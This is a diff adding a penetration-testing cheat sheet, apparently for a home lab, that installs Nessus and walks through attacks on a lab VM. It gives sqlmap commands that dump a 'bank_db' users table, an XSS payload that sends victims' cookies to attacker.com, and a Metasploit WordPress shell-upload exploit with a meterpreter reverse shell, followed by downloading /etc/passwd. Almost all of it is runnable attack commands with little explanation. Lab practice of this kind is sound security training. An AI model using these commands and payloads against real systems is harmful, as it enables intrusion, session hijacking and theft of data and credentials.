@@ -1,0 +1,124 @@
+﻿===============================
+🛠️ Nessus Installation & Setup
+===============================
+
+
+# Update and install Nessus (on Kali Linux)
+sudo apt update
+sudo apt install nessus
+
+
+# Start the Nessus service
+sudo systemctl start nessusd
+sudo systemctl enable nessusd
+
+
+# Access Nessus web interface in browser
+https://localhost:8834
+
+
+# Create Nessus user and configure a Basic Network Scan
+# Target IP: 192.168.56.101 (Bitnami or OWASP VM)
+
+
+---
+
+
+===============================
+🕳️ SQL Injection Exploitation
+===============================
+
+
+# Initial scan with sqlmap to detect SQLi vulnerability
+sqlmap -u "http://target-site.com/vulnerable-page.php?id=1" --batch --dbs
+
+
+# Enumerate tables in a database
+sqlmap -u "http://target-site.com/vulnerable-page.php?id=1" -D bank_db --tables
+
+
+# Extract data from a specific table
+sqlmap -u "http://target-site.com/vulnerable-page.php?id=1" -D bank_db -T users --dump
+
+
+---
+
+
+===============================
+💻 Cross-Site Scripting (XSS)
+===============================
+
+
+# Basic reflected XSS payload test
+<script>alert('XSS');</script>
+
+
+# Insert payload into input fields (e.g., comment box or search bar)
+# Observe browser behavior for script execution
+
+
+# Advanced payload to steal cookies (for educational/demo use only)
+<script>document.location='http://attacker.com?cookie='+document.cookie</script>
+
+
+---
+
+
+===============================
+🎯 Metasploit Exploitation
+===============================
+
+
+# Launch Metasploit console
+msfconsole
+
+
+# Search for WordPress exploit (example)
+search wordpress
+
+
+# Use exploit module for vulnerable plugin
+use exploit/unix/webapp/wp_admin_shell_upload
+
+
+# Set target IP and plugin path
+set RHOSTS 192.168.56.101
+set TARGETURI /wp-content/plugins/vulnerable-plugin/
+
+
+# Set payload and listener options
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 192.168.56.1
+set LPORT 4444
+
+
+# Run the exploit
+exploit
+
+
+# Post-exploitation: Get system info, download file
+sysinfo
+download /etc/passwd
+
+
+---
+
+
+===============================
+📋 Additional Commands
+===============================
+
+
+# List available databases and tables in sqlmap
+--dbs
+--tables
+--columns
+
+
+# Metasploit session interaction
+sessions -i 1
+shell
+
+
+# Stop Nessus service (optional)
+sudo systemctl stop nessusd
